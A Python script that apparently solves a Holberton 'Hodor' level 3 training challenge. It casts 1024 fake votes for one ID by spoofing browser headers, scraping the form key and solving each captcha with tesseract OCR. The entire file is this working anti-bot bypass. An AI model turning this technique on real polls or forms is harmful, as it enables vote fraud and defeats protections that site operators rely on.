#!/usr/bin/python3
"""votes 1024 times for my Holberton Id.

Requirements:

    - tesseract: Google open source OCR
    - bs4(beautifulSoup)
"""


from os import remove
from requests import session, get
from bs4 import BeautifulSoup

Url = "http://158.69.76.135/level3.php"
url_captcha = "http://158.69.76.135/captcha.php"

user_agent = ("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) "
              "Gecko/20100101 Firefox/47.0")

header = {"User-Agent": user_agent, "referer": Url}

data = {"id": "3923", "holdthedoor": "submit", "key": "", "captcha": ''}

reject = b"See you later hacker! [11]"


def get_key(html):
    """Gets the randomic security key"""

    soup = BeautifulSoup(page.text, "html.parser")
    key = soup.find('form').find('input', {'name': 'key'})['value']
    return key


def save_captcha(content):
    """Writes the captcha png file to tmp directory"""

    f = open("/tmp/captcha.png", "wb")
    f.write(content)
    f.close()


def read_captcha():
    """Reads from txt captcha file for the captcha text"""

    f = open("/tmp/captcha.txt", 'r')
    txt = f.read().replace('\n', '')
    f.close()
    return txt


def OCR():
    """Executes tesseract OCR application"""

    exec('import subprocess; subprocess.call(["/usr/bin/tesseract", \
        "/tmp/captcha.png", "/tmp/captcha"])')


def get_count():
    """Return the current vote count of an ID
    """
    html = get(Url)
    soup = BeautifulSoup(html.text, "html.parser")
    count = list(soup.find_all("td"))
    for i in range(len(count)):
        if data["id"] in str(count[i].text):
            return int(count[i + 1].text[1:])
    return False


def set_counter():
    """sets the conter variable
    0 if the Id is new for voting"""
    if get_count() is False:
        return 0
    return get_count()


if __name__ == "__main__":

    i = set_counter()

    while(i < 1024):
        hodor_session = session()
        page = hodor_session.get(url=Url, headers=header)

        data["key"] = get_key(page)

        save_captcha(hodor_session.get(url_captcha).content)
        OCR()
        remove("/tmp/captcha.png")

        data["captcha"] = read_captcha()

        session_response = hodor_session.post(Url, headers=header, data=data)

        if session_response.status_code == 200 and \
           reject not in session_response.content:
            print('Sending vote number: \033[32m{}\033[0m'.format(i + 1))
            i += 1
        else:
            print('\033[31mFailed! trying again vote: {}\033[0m'.format(i + 1))

    print("------------------------------------------------------------------")
    print("ID: \033[32m{}\033[0m, CURRENT VOTES: \033[32m{}\033[0m -- 1024\
    ".format(data["id"], i))
    print("------------------------------------------------------------------")
    print("\033[32m!HODOR LEVEL3 SUCCESSFUL CHEAT VOTING¡")
    print("------------------------------------------------------------------")
